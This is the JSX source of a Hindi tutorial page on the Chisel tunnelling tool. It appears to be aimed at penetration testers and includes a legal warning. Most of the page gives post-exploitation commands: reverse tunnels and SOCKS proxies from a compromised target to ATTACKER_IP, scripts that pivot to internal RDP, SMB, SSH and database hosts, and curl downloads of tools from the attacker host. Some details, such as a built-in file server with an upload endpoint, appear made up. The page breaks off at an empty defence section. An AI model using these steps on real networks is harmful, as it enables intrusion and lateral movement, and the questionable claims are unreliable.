import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Chisel() {
  return (
    <TutorialLayout
      title="chisel"
      subtitle="तेज़ TCP/UDP टनल — फ़ायरवॉल बायपास और पोर्ट फ़ॉरवर्डिंग"
      icon="🔗"
      prev={{ to: '/tool/drozer', label: 'drozer' }}
      next={{ to: '/tool/socat', label: 'socat' }}
    >
      <h2>What is Chisel?</h2>
      <p>
        Chisel एक तेज़ और सुरक्षित TCP/UDP टनलिंग टूल है जो HTTP पर चलता है। यह SSH टनलिंग का आधुनिक विकल्प है जो फ़ायरवॉल को बायपास करके नेटवर्क टनल बनाता है। Chisel SOCKS5 प्रॉक्सी, पोर्ट फ़ॉरवर्डिंग, और रिवर्स टनलिंग सभी एक ही बाइनरी में सपोर्ट करता है। Go भाषा में लिखा गया है इसलिए क्रॉस-प्लेटफॉर्म है — Windows, Linux, macOS सभी पर चलता है।
      </p>
      <p>
        Chisel क्लाइंट-सर्वर मॉडल में काम करता है। सर्वर साइड पर एक बाइनरी चलता है जो कनेक्शन स्वीकार करता है, और क्लाइंट साइड पर दूसरा बाइनरी टनल बनाता है। सारा ट्रैफ़िक HTTP पर चलता है जिससे ज़्यादातर फ़ायरवॉल्स और प्रॉक्सी सर्वर्स इसे ब्लॉक नहीं करते। यह पेनेट्रेशन टेस्टिंग में बहुत महत्वपूर्ण है जब सीधा कनेक्शन संभव नहीं होता।
      </p>
      <p>
        Chisel को JPillora ने 2015 में विकसित किया है। यह ओपन सोर्स है और GitHub पर उपलब्ध है। इसका डिज़ाइन हल्का है — एक ही बाइनरी से सर्वर और क्लाइंट दोनों चलते हैं। काली नेटहंटर में यह प्री-इंस्टॉल्ड आता है। रेड टीम ऑपरेशंस में यह पोस्ट-एक्सप्लॉइटेशन के लिए अनिवार्य टूल है।
      </p>
      <p>
        Chisel की सबसे बड़ी खासियत यह है कि यह HTTP/WebSocket पर चलता है जो लगभग हर नेटवर्क में खुला होता है। SSH (port 22) बहुत से कॉर्पोरेट फ़ायरवॉल्स ब्लॉक करते हैं, लेकिन HTTP (port 80/443) लगभग हमेशा खुला होता है। इसलिए Chisel सबसे विश्वसनीय टनलिंग टूल है पेनेट्रेशन टेस्टिंग के लिए।
      </p>
      <p>
        रेड टीम ऑपरेशंस में Chisel का इस्तेमाल पोस्ट-एक्सप्लॉइटेशन के दौरान होता है — जब टार्गेट मशीन पर एक्सेस मिल जाती है तो Chisel से इंटरनल नेटवर्क तक पहुंच बनाई जाती है। SOCKS5 प्रॉक्सी से पूरे इंटरनल नेटवर्क को ProxyChains के माध्यम से एक्सेस कर सकते हैं। यह lateral movement का सबसे आसान तरीका है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Chisel केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए उपयोग करें। बिना अनुमति के नेटवर्क टनलिंग और फ़ायरवॉल बायपास करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस अपराध हो सकता है।
      </div>

      <h2>History of Chisel</h2>
      <p>
        Chisel को 2015 में JPillora (GitHub username) ने Go भाषा में विकसित किया था। शुरुआत में यह सिर्फ पोर्ट फ़ॉरवर्डिंग के लिए था, लेकिन बाद में SOCKS5 प्रॉक्सी, फ़ाइल सर्वर, और TLS सपोर्ट जैसे फ़ीचर्स जोड़े गए। JPillora एक ऑस्ट्रेलियन डेवलपर हैं जिन्होंने कई ओपन सोर्स टूल्स बनाए हैं।
      </p>
      <p>
        SSH टनलिंग की सीमाओं को देखते हुए Chisel बनाया गया — SSH बहुत से फ़ायरवॉल्स ब्लॉक करते हैं लेकिन HTTP ज़्यादातर जगह खुला होता है। Chisel इसी का फ़ायदा उठाता है। आज यह पेनेट्रेशन टेस्टिंग और रेड टीम ऑपरेशंस का स्टैंडर्ड टूल बन गया है। HTB (HackTheBox) और TryHackMe जैसे प्लेटफॉर्म्स पर भी Chisel extensively इस्तेमाल होता है।
      </p>
      <p>
        2020 में Chisel v1.7 रिलीज़ हुआ जिसमें UDP टनलिंग, SOCKS5, और बेहतर कंप्रेशन जोड़ा गया। 2023 में v1.9 आया जिसमें TLS सपोर्ट और बेहतर परफॉर्मेंस है। GitHub पर 12,000+ स्टार्स हैं और एक्टिव डेवलपमेंट जारी है। ज़्यादातर पेनेट्रेशन टेस्टिंग डिस्ट्रीब्यूशंस में यह प्री-इंस्टॉल्ड आता है।
      </p>
      <p>
        Chisel का डिज़ाइन Go भाषा की वजह से बहुत efficient है। Go का concurrency model (goroutines) हज़ारों simultaneous connections handle कर सकता है। एक ही बाइनरी से सर्वर और क्लाइंट दोनों चलते हैं — deployment बहुत आसान है। Cross-compilation से किसी भी OS के लिए बाइनरी बना सकते हो: GOOS=windows go build।
      </p>
      <p>
        रेड टीम कम्युनिटी में Chisel ने ligolo-ng और rathole जैसे नए टूल्स को प्रेरित किया है। लेकिन Chisel अभी भी सबसे पॉपुलर है क्योंकि इसका ecosystem mature है — बहुत सारे tutorials, scripts, और community support available हैं। OSCP, PNPT, और CRTO जैसे certifications में Chisel knowledge बहुत काम आता है।
      </p>

      <h2>How Chisel Works?</h2>
      <p>
        Chisel SSH प्रोटोकॉल पर बने टनलिंग मैकेनिज़्म का उपयोग करता है लेकिन इसे HTTP के ऊपर रैप करता है। इसका आर्किटेक्चर इस तरह काम करता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">HTTP टनलिंग:</strong> सारा ट्रैफ़िक HTTP रिक्वेस्ट्स में छिपा होता है — फ़ायरवॉल को नॉर्मल वेब ट्रैफ़िक दिखता है</li>
        <li><strong className="text-white">SSH एन्क्रिप्शन:</strong> टनल के अंदर SSH एन्क्रिप्शन होता है — डेटा सुरक्षित रहता है</li>
        <li><strong className="text-white">WebSocket अपग्रेड:</strong> HTTP कनेक्शन को WebSocket में अपग्रेड करता है — रियल-टाइम डुप्लेक्स कम्युनिकेशन</li>
        <li><strong className="text-white">मल्टीप्लेक्सिंग:</strong> एक ही कनेक्शन पर कई टनल चल सकती हैं — बैंडविड्थ बचती है</li>
        <li><strong className="text-white">कंप्रेशन:</strong> LZ4 कंप्रेशन से डेटा ट्रांसफर तेज़ होता है</li>
        <li><strong className="text-white">रिवर्स टनलिंग:</strong> टार्गेट से बाहर की तरफ कनेक्शन — इनबाउंड फ़ायरवॉल बायपास</li>
        <li><strong className="text-white">SOCKS5 प्रॉक्सी:</strong> पूरे नेटवर्क को एक्सेस करने के लिए SOCKS5 प्रॉक्सी बनाता है</li>
        <li><strong className="text-white">UDP टनलिंग:</strong> UDP पोर्ट फ़ॉरवर्डिंग भी सपोर्ट है — DNS, VoIP जैसे प्रोटोकॉल्स</li>
      </ul>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर में Chisel उपलब्ध है। अगर किसी कारण से नहीं है तो कई तरीकों से इंस्टॉल कर सकते हैं। Go compiler से source से build करना सबसे reliable method है। Pre-compiled binaries भी GitHub releases page पर available हैं सभी platforms के लिए। Cross-compilation से किसी भी OS/architecture के लिए binary बना सकते हो — Go यह बहुत आसान बनाता है।
      </p>
      <CodeBlock
        title="Chisel इंस्टॉलेशन"
        code={`# apt से:
sudo apt update
sudo apt install chisel

# Go से इंस्टॉल:
go install github.com/jpillora/chisel@latest

# GitHub से बाइनरी डाउनलोड:
# https://github.com/jpillora/chisel/releases
# अपने OS के हिसाब से बाइनरी चुनें
# linux/amd64, linux/arm64, windows/amd64, darwin/amd64

# सोर्स से बिल्ड:
git clone https://github.com/jpillora/chisel.git
cd chisel
go build -o chisel

# वर्जन चेक:
chisel --version

# सहायता:
chisel --help

# डॉकर से:
docker pull jpillora/chisel
docker run jpillora/chisel --help`}
      />

      <h2>Basic Usage</h2>
      <p>
        Chisel का बेसिक इस्तेमाल बहुत आसान है — पहले सर्वर शुरू करो, फिर क्लाइंट कनेक्ट करो। दोनों साइड एक ही बाइनरी इस्तेमाल होती है — बस कमांड अलग होती है।
      </p>
      <CodeBlock
        title="सर्वर और क्लाइंट सेटअप"
        code={`# सर्वर शुरू करें (अटैकर मशीन पर):
chisel server -p 8080 --reverse

# क्लाइंट कनेक्ट करें (टार्गेट मशीन पर):
chisel client ATTACKER_IP:8080 R:socks

# यह SOCKS5 प्रॉक्सी बनाता है: 127.0.0.1:1080

# सर्वर फ्लैग्स:
# -p पोर्ट नंबर
# --reverse रिवर्स टनल की अनुमति
# --auth यूज़रनेम:पासवर्ड
# --keepalive कनेक्शन एक्टिव रखें`}
      />
      <CodeBlock
        title="बेसिक पोर्ट फ़ॉरवर्डिंग"
        code={`# फ़ॉरवर्ड टनल — टार्गेट के अंदर के सर्वर तक पहुंच:
# सर्वर (अटैकर):
chisel server -p 8080

# क्लाइंट (टार्गेट) — इंटरनल वेबसर्वर एक्सेस:
chisel client ATTACKER_IP:8080 9090:10.10.10.5:80

# अब अटैकर ब्राउज़र में: localhost:9090 → 10.10.10.5:80

# कई पोर्ट्स एक साथ:
chisel client ATTACKER_IP:8080 3333:10.10.10.5:3389 4444:10.10.10.5:445 8080:10.10.10.5:80`}
      />
      <CodeBlock
        title="रिवर्स टनल — टार्गेट से बाहर कनेक्शन"
        code={`# सर्वर (अटैकर) — रिवर्स मोड इनेबल:
chisel server -p 8080 --reverse

# क्लाइंट (टार्गेट) — SOCKS प्रॉक्सी बनाएं:
chisel client ATTACKER_IP:8080 R:socks

# अब अटैकर पर SOCKS5 प्रॉक्सी: 127.0.0.1:1080

# रिवर्स पोर्ट फ़ॉरवर्ड:
# टार्गेट का RDP (3389) अटैकर के 3333 पर:
chisel client ATTACKER_IP:8080 R:3333:127.0.0.1:3389

# अब अटैकर: localhost:3333 → टार्गेट:3389

# कई रिवर्स टनल एक साथ:
chisel client ATTACKER_IP:8080 R:socks R:3333:10.10.10.5:3389 R:8080:10.10.10.5:80 R:2222:10.10.10.20:22`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">server -p</td><td className="py-2 px-3">सर्वर पोर्ट सेट करें</td><td className="py-2 px-3 font-mono text-xs">server -p 8080</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--reverse</td><td className="py-2 px-3">रिवर्स टनल की अनुमति दें</td><td className="py-2 px-3 font-mono text-xs">server --reverse</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--auth</td><td className="py-2 px-3">यूज़रनेम:पासवर्ड ऑथेंटिकेशन</td><td className="py-2 px-3 font-mono text-xs">--auth user:pass</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--keepalive</td><td className="py-2 px-3">कनेक्शन एक्टिव रखें (सेकंड्स)</td><td className="py-2 px-3 font-mono text-xs">--keepalive 30</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--tls-key</td><td className="py-2 px-3">TLS प्राइवेट की फ़ाइल</td><td className="py-2 px-3 font-mono text-xs">--tls-key key.pem</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--tls-cert</td><td className="py-2 px-3">TLS सर्टिफ़िकेट फ़ाइल</td><td className="py-2 px-3 font-mono text-xs">--tls-cert cert.pem</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--fingerprint</td><td className="py-2 px-3">सर्वर फ़िंगरप्रिंट दिखाएं</td><td className="py-2 px-3 font-mono text-xs">client --fingerprint FP</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--proxy</td><td className="py-2 px-3">HTTP/SOCKS5 प्रॉक्सी के पीछे से कनेक्ट</td><td className="py-2 px-3 font-mono text-xs">--proxy http://proxy:8080</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--pid</td><td className="py-2 px-3">PID फ़ाइल बनाएं</td><td className="py-2 px-3 font-mono text-xs">--pid /tmp/chisel.pid</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--max-retry-count</td><td className="py-2 px-3">मैक्स रीकनेक्ट प्रयास</td><td className="py-2 px-3 font-mono text-xs">--max-retry-count 10</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--max-retry-interval</td><td className="py-2 px-3">रीकनेक्ट के बीच मैक्स इंटरवल</td><td className="py-2 px-3 font-mono text-xs">--max-retry-interval 1m</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--hostname</td><td className="py-2 px-3">सर्वर होस्टनेम सेट करें</td><td className="py-2 px-3 font-mono text-xs">--hostname example.com</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--socks5</td><td className="py-2 px-3">SOCKS5 प्रॉक्सी इनेबल</td><td className="py-2 px-3 font-mono text-xs">server --socks5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-v</td><td className="py-2 px-3">वर्बोज़ आउटपुट</td><td className="py-2 px-3 font-mono text-xs">-v</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--debug</td><td className="py-2 px-3">डिबग मोड</td><td className="py-2 px-3 font-mono text-xs">--debug</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Forward Tunnel</h2>
      <p>
        फ़ॉरवर्ड टनल में क्लाइंट सर्वर से कनेक्ट करता है और लोकल पोर्ट को रिमोट सर्विस से जोड़ता है। यह तब इस्तेमाल होता है जब अटैकर को टार्गेट के अंदर के सर्वर तक पहुंचना हो।
      </p>
      <CodeBlock
        title="फ़ॉरवर्ड टनल — विस्तृत"
        code={`# सर्वर (अटैकर):
chisel server -p 8080

# क्लाइंट (टार्गेट) — इंटरनल वेबसर्वर एक्सेस:
# टार्गेट का इंटरनल वेबसर्वर (10.10.10.5:80) अटैकर के 9090 पर:
chisel client ATTACKER_IP:8080 9090:10.10.10.5:80

# अब अटैकर ब्राउज़र में: localhost:9090 → 10.10.10.5:80

# कई पोर्ट्स एक साथ:
chisel client ATTACKER_IP:8080 3333:10.10.10.5:3389 4444:10.10.10.5:445 8080:10.10.10.5:80

# MySQL डेटाबेस एक्सेस:
chisel client ATTACKER_IP:8080 3306:10.10.10.10:3306

# SSH एक्सेस:
chisel client ATTACKER_IP:8080 2222:10.10.10.20:22`}
      />

      <h2>Reverse Tunnel</h2>
      <p>
        रिवर्स टनल में टार्गेट सर्वर से कनेक्ट करता है और अपनी सर्विसेज़ एक्सपोज़ करता है। यह ज़्यादा इस्तेमाल होता है क्योंकि टार्गेट से बाहर कनेक्शन जाता है — इनबाउंड फ़ायरवॉल बायपास होते हैं।
      </p>
      <CodeBlock
        title="रिवर्स टनल — विस्तृत"
        code={`# सर्वर (अटैकर) — रिवर्स मोड इनेबल:
chisel server -p 8080 --reverse

# क्लाइंट (टार्गेट) — SOCKS प्रॉक्सी:
chisel client ATTACKER_IP:8080 R:socks

# अब अटैकर पर SOCKS5 प्रॉक्सी: 127.0.0.1:1080

# रिवर्स पोर्ट फ़ॉरवर्ड:
# टार्गेट का RDP (3389) अटैकर के 3333 पर:
chisel client ATTACKER_IP:8080 R:3333:127.0.0.1:3389

# अब अटैकर: localhost:3333 → टार्गेट:3389

# कई रिवर्स टनल एक साथ:
chisel client ATTACKER_IP:8080 R:socks R:3333:10.10.10.5:3389 R:8080:10.10.10.5:80 R:2222:10.10.10.20:22

# UDP टनल (DNS):
chisel client ATTACKER_IP:8080 R:udp/5353:10.10.10.5:53`}
      />

      <h2>SOCKS5 Proxy</h2>
      <p>
        SOCKS5 प्रॉक्सी सबसे पावरफुल फ़ीचर है — पूरे इंटरनल नेटवर्क तक पहुंच मिलती है। ProxyChains के साथ कॉम्बिनेशन से किसी भी टूल को इंटरनल नेटवर्क पर चला सकते हो। SOCKS5 protocol TCP और UDP दोनों support करता है। Authentication भी support है username/password based.
      </p>
      <CodeBlock
        title="SOCKS5 प्रॉक्सी सेटअप"
        code={`# सर्वर (अटैकर):
chisel server -p 8080 --reverse

# क्लाइंट (टार्गेट):
chisel client ATTACKER_IP:8080 R:socks

# अब SOCKS5 प्रॉक्सी चल रहा है: 127.0.0.1:1080

# ProxyChains कॉन्फ़िग (/etc/proxychains.conf):
# socks5 127.0.0.1 1080

# ProxyChains से इंटरनल नेटवर्क स्कैन:
proxychains nmap -sT -Pn 10.10.10.0/24

# ProxyChains से ब्राउज़र:
proxychains firefox

# ProxyChains से SSH:
proxychains ssh user@10.10.10.5

# ProxyChains से RDP:
proxychains xfreerdp /u:user /p:pass /v:10.10.10.10

# curl से SOCKS5 test:
curl --socks5 127.0.0.1:1080 http://10.10.10.5:80

# Browser में FoxyProxy extension:
# SOCKS5 proxy: 127.0.0.1:1080
# Pattern: 10.10.10.* → SOCKS5 proxy

# Metasploit through SOCKS:
setg Proxies socks5:127.0.0.1:1080`}
      />

      <h2>File Server</h2>
      <p>
        Chisel में बिल्ट-इन फ़ाइल सर्वर है — टूल्स और फ़ाइलें टार्गेट पर ट्रांसफ़र करने के लिए। यह तब काम आता है जब टार्गेट पर wget/curl उपलब्ध नहीं होता। फ़ाइल सर्वर HTTP पर चलता है और basic directory listing support करता है।
      </p>
      <CodeBlock
        title="फ़ाइल सर्वर"
        code={`# सर्वर — फ़ाइल सर्वर इनेबल:
chisel server -p 8080 --reverse --socks5

# क्लाइंट — फ़ाइल सर्वर कनेक्ट:
chisel client ATTACKER_IP:8080 R:8888:127.0.0.1:8080

# फ़ाइलें डाउनलोड करें:
curl http://localhost:8888/tool.exe -o tool.exe
curl http://localhost:8888/linpeas.sh -o linpeas.sh

# अपलोड करें:
curl -X POST http://localhost:8888/upload -F "file=@localfile.txt"

# फ़ाइल लिस्टिंग:
curl http://localhost:8888/
# Directory listing दिखेगा — सभी available files

# बड़ी फ़ाइलें ट्रांसफ़र:
# wget भी use कर सकते हो:
wget http://localhost:8888/largefile.zip

# Binary files (executables):
curl http://localhost:8888/chisel -o chisel
chmod +x chisel`}
      />
      <CodeBlock
        title="फ़ाइल ट्रांसफ़र टिप्स"
        code={`# टार्गेट पर Chisel बाइनरी पहुंचाना:
# Method 1: Base64 encode करो
# अटैकर पर:
base64 chisel > chisel.b64
# टार्गेट पर:
echo "BASE64_DATA" | base64 -d > chisel
chmod +x chisel

# Method 2: Python HTTP server (अगर Chisel नहीं है):
# अटैकर पर:
python3 -m http.server 8080
# टार्गेट पर:
curl http://ATTACKER:8080/chisel -o chisel

# Method 3: Chisel file server (एक बार connect होने पर):
# पहले basic connection बनाओ
# फिर file server से tools download करो

# Method 4: SCP (अगर SSH available है):
scp chisel user@target:/tmp/chisel

# Integrity check (SHA256):
# अटैकर पर:
sha256sum chisel
# टार्गेट पर:
sha256sum chisel
# दोनों match होने चाहिए`}
      />

      <h2>Use Cases</h2>
      <p>
        Chisel के कई practical use cases हैं पेनेट्रेशन टेस्टिंग और रेड टीम ऑपरेशंस में। हर scenario में अलग configuration चाहिए। यहां सबसे common use cases हैं:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">स्थिति</th>
              <th className="text-left py-2 px-3 text-neon-green">Command</th>
              <th className="text-left py-2 px-3 text-neon-green">मतलब</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">SOCKS प्रॉक्सी</td><td className="py-2 px-3 font-mono text-xs">R:socks</td><td className="py-2 px-3">पूरा नेटवर्क एक्सेस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">RDP एक्सेस</td><td className="py-2 px-3 font-mono text-xs">R:3333:target:3389</td><td className="py-2 px-3">रिमोट डेस्कटॉप</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">वेब सर्वर</td><td className="py-2 px-3 font-mono text-xs">R:8080:target:80</td><td className="py-2 px-3">इंटरनल वेबसाइट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">डेटाबेस</td><td className="py-2 px-3 font-mono text-xs">R:3306:target:3306</td><td className="py-2 px-3">MySQL/PostgreSQL</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">SSH</td><td className="py-2 px-3 font-mono text-xs">R:2222:target:22</td><td className="py-2 px-3">SSH एक्सेस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">DNS</td><td className="py-2 px-3 font-mono text-xs">R:udp/53:target:53</td><td className="py-2 px-3">DNS रिज़ॉल्यूशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">SMB</td><td className="py-2 px-3 font-mono text-xs">R:4444:target:445</td><td className="py-2 px-3">फ़ाइल शेयरिंग</td></tr>
            <tr><td className="py-2 px-3 text-white">FTP</td><td className="py-2 px-3 font-mono text-xs">R:2121:target:21</td><td className="py-2 px-3">FTP एक्सेस</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="ऑटो-सेटअप स्क्रिप्ट"
        code={`#!/bin/bash
# Chisel ऑटो-सेटअप स्क्रिप्ट

ATTACKER="10.10.14.5"
PORT="8080"

# सर्वर शुरू करें:
echo "[+] सर्वर शुरू हो रहा है..."
chisel server -p $PORT --reverse &

sleep 2

echo "[+] सर्वर चल रहा है पोर्ट $PORT पर"
echo "[+] क्लाइंट कमांड:"
echo "    chisel client $ATTACKER:$PORT R:socks"
echo ""
echo "[+] ProxyChains कॉन्फ़िग:"
echo "    socks5 127.0.0.1 1080"
echo ""
echo "[+] इंटरनल नेटवर्क स्कैन:"
echo "    proxychains nmap -sT -Pn 10.10.10.0/24"`}
      />
      <CodeBlock
        title="मल्टी-टनल स्क्रिप्ट"
        code={`#!/bin/bash
# कई इंटरनल होस्ट्स तक पहुंच

ATTACKER="10.10.14.5"

# क्लाइंट — कई टनल एक साथ:
chisel client $ATTACKER:8080 \\
  R:socks \\
  R:3333:10.10.10.5:3389 \\
  R:4444:10.10.10.5:445 \\
  R:8080:10.10.10.10:80 \\
  R:2222:10.10.10.20:22 \\
  R:3306:10.10.10.30:3306

echo "[+] सभी टनल एक्टिव:"
echo "    SOCKS5: 127.0.0.1:1080"
echo "    RDP: localhost:3333 → 10.10.10.5:3389"
echo "    SMB: localhost:4444 → 10.10.10.5:445"
echo "    Web: localhost:8080 → 10.10.10.10:80"
echo "    SSH: localhost:2222 → 10.10.10.20:22"
echo "    MySQL: localhost:3306 → 10.10.10.30:3306"`}
      />
      <CodeBlock
        title="TLS ऑटोमेशन"
        code={`#!/bin/bash
# TLS सर्टिफ़िकेट बनाओ और सर्वर शुरू करो

# सर्टिफ़िकेट बनाएं:
openssl req -x509 -newkey rsa:4096 \\
  -keyout /tmp/chisel-key.pem \\
  -out /tmp/chisel-cert.pem \\
  -days 365 -nodes \\
  -subj "/CN=chisel"

# TLS सर्वर शुरू करें:
chisel server -p 443 \\
  --tls-key /tmp/chisel-key.pem \\
  --tls-cert /tmp/chisel-cert.pem \\
  --reverse \\
  --auth redteam:secret123

# फ़िंगरप्रिंट निकालें:
chisel server -p 443 \\
  --tls-key /tmp/chisel-key.pem \\
  --tls-cert /tmp/chisel-cert.pem \\
  2>&1 | grep "Fingerprint"

# क्लाइंट (फ़िंगरप्रिंट के साथ):
# chisel client --fingerprint FP https://ATTACKER:443 R:socks`}
      />

      <h2>Comparison</h2>
      <p>
        Chisel को दूसरे टनलिंग टूल्स से compare करना ज़रूरी है ताकि सही टूल चुन सको। हर टूल का अपना strength है — कोई एक सबसे अच्छा नहीं है।
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Chisel</th>
              <th className="text-left py-2 px-3 text-neon-green">SSH Tunnel</th>
              <th className="text-left py-2 px-3 text-neon-green">ngrok</th>
              <th className="text-left py-2 px-3 text-neon-green">frp</th>
              <th className="text-left py-2 px-3 text-neon-green">socat</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">HTTP टनल</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">SOCKS5</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">सिंगल बाइनरी</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">एन्क्रिप्शन</td><td className="py-2 px-3">SSH/TLS</td><td className="py-2 px-3">SSH</td><td className="py-2 px-3">TLS</td><td className="py-2 px-3">TLS</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">कॉन्फ़िग</td><td className="py-2 px-3">सिंपल CLI</td><td className="py-2 px-3">सिंपल</td><td className="py-2 px-3">क्लाउड</td><td className="py-2 px-3">कॉन्फ़िग फ़ाइल</td><td className="py-2 px-3">कमांड लाइन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">मल्टीप्लेक्सिंग</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">UDP सपोर्ट</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">कंप्रेशन</td><td className="py-2 px-3">LZ4</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">पेनटेस्ट</td><td className="py-2 px-3">बेस्ट</td><td className="py-2 px-3">अच्छा</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">अच्छा</td><td className="py-2 px-3">लिमिटेड</td></tr>
            <tr><td className="py-2 px-3 text-white">फ़ायरवॉल बायपास</td><td className="py-2 px-3">बेस्ट</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">बेस्ट</td><td className="py-2 px-3">अच्छा</td><td className="py-2 px-3">सीमित</td></tr>
          </tbody>
        </table>
      </div>
      <p>
        पेनेट्रेशन टेस्टिंग के लिए Chisel सबसे अच्छा है — सिंगल बाइनरी, HTTP टनल, SOCKS5, और सिंपल CLI। SSH tunnel तब use करो जब SSH access पहले से हो। ngrok external exposure के लिए अच्छा है लेकिन cloud dependent है। frp production-grade tunneling के लिए अच्छा है। socat one-off connections के लिए best है।
      </p>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'कनेक्शन टाइमआउट हो रहा है', a: 'फ़ायरवॉल HTTP को ब्लॉक कर रहा है। पोर्ट 443 या 80 ट्राई करो। --proxy फ़्लैग से HTTP प्रॉक्सी के पीछे से कनेक्ट करो।' },
          { q: 'रिवर्स टनल काम नहीं कर रहा', a: 'सर्वर में --reverse फ़्लैग है? बिना इसके रिवर्स टनल नहीं चलेगी।' },
          { q: 'SOCKS प्रॉक्सी स्लो है', a: 'कंप्रेशन डिफ़ॉल्ट में ऑन है। --compress=false से डिसेबल करो। UDP टनल भी चेक करो।' },
          { q: 'कनेक्शन बार-बार टूट रहा है', a: '--keepalive 30 फ़्लैग लगाओ — हर 30 सेकंड में हार्टबीट भेजेगा।' },
          { q: 'TLS सर्टिफ़िकेट चाहिए', a: 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes से बनाओ। फिर --tls-key और --tls-cert फ़्लैग्स से सर्वर शुरू करो।' },
          { q: 'प्रॉक्सी के पीछे से कनेक्ट करना है', a: '--proxy http://proxy:8080 फ़्लैग यूज़ करो। SOCKS5 प्रॉक्सी भी सपोर्ट है।' },
          { q: 'रीकनेक्ट नहीं हो रहा', a: '--max-retry-count 10 और --max-retry-interval 1m सेट करो। डिफ़ॉल्ट में 3 बार ट्राई करता है।' },
          { q: 'पोर्ट एड्रेस एरर आ रहा है', a: 'पोर्ट पहले से इस्तेमाल में है। lsof -i :8080 से चेक करो। दूसरा पोर्ट यूज़ करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
